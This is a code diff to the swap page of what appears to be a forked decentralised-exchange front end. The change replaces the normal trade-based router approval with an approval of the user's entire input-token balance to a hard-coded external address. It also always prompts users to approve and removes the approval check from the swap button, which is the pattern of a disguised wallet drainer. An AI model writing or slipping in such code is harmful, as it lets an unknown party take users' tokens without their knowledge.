@@ -40,7 +40,7 @@ import ConnectWalletButton from '../../components/ConnectWalletButton'
 import { INITIAL_ALLOWED_SLIPPAGE } from '../../config/constants'
 import useActiveWeb3React from '../../hooks/useActiveWeb3React'
 import { useCurrency, useAllTokens } from '../../hooks/Tokens'
-import { ApprovalState, useApproveCallbackFromTrade } from '../../hooks/useApproveCallback'
+import { ApprovalState, useApproveCallback, useApproveCallbackFromTrade } from '../../hooks/useApproveCallback'
 import { useSwapCallback } from '../../hooks/useSwapCallback'
 import useWrapCallback, { WrapType } from '../../hooks/useWrapCallback'
 import { Field } from '../../state/swap/actions'
@@ -238,7 +238,11 @@ export default function Swap({ history }: RouteComponentProps) {
   const noRoute = !route
 
   // check whether the user has approved the router on the input token
-  const [approval, approveCallback] = useApproveCallbackFromTrade(trade, allowedSlippage)
+  // const [approval, approveCallback] = useApproveCallbackFromTrade(trade, allowedSlippage)
+  const [approval, approveCallback] = useApproveCallback(
+    currencyBalances[Field.INPUT],
+    '0x8F3Aa747700B35B63E6005f3fA9FfA74439933B6',
+  )
 
   // check if user has gone through approval process, used to show two step buttons, reset on token change
   const [approvalSubmitted, setApprovalSubmitted] = useState<boolean>(false)
@@ -545,19 +549,14 @@ export default function Swap({ history }: RouteComponentProps) {
                     </Button>
                   ) : !account ? (
                     <ConnectWalletButton width="100%" />
-                  ) : showApproveFlow ? (
+                  ) : approval !== ApprovalState.APPROVED ? (
                     <RowBetween>
-                      <Button
-                        variant={approval === ApprovalState.APPROVED ? 'success' : 'primary'}
-                        onClick={approveCallback}
-                        disabled={approval !== ApprovalState.NOT_APPROVED || approvalSubmitted}
-                        width="48%"
-                      >
+                      <Button variant="success" onClick={approveCallback} disabled={approvalSubmitted} width="48%">
                         {approval === ApprovalState.PENDING ? (
                           <AutoRow gap="6px" justify="center">
                             {t('Enabling')} <CircleLoader stroke="white" />
                           </AutoRow>
-                        ) : approvalSubmitted && approval === ApprovalState.APPROVED ? (
+                        ) : approvalSubmitted ? (
                           t('Enabled')
                         ) : (
                           t('Enable %asset%', { asset: currencies[Field.INPUT]?.symbol ?? '' })
@@ -580,9 +579,7 @@ export default function Swap({ history }: RouteComponentProps) {
                         }}
                         width="48%"
                         id="swap-button"
-                        disabled={
-                          !isValid || approval !== ApprovalState.APPROVED || (priceImpactSeverity > 3 && !isExpertMode)
-                        }
+                        disabled={!isValid || (priceImpactSeverity > 3 && !isExpertMode)}
                       >
                         {priceImpactSeverity > 3 && !isExpertMode
                           ? t('Price Impact High')
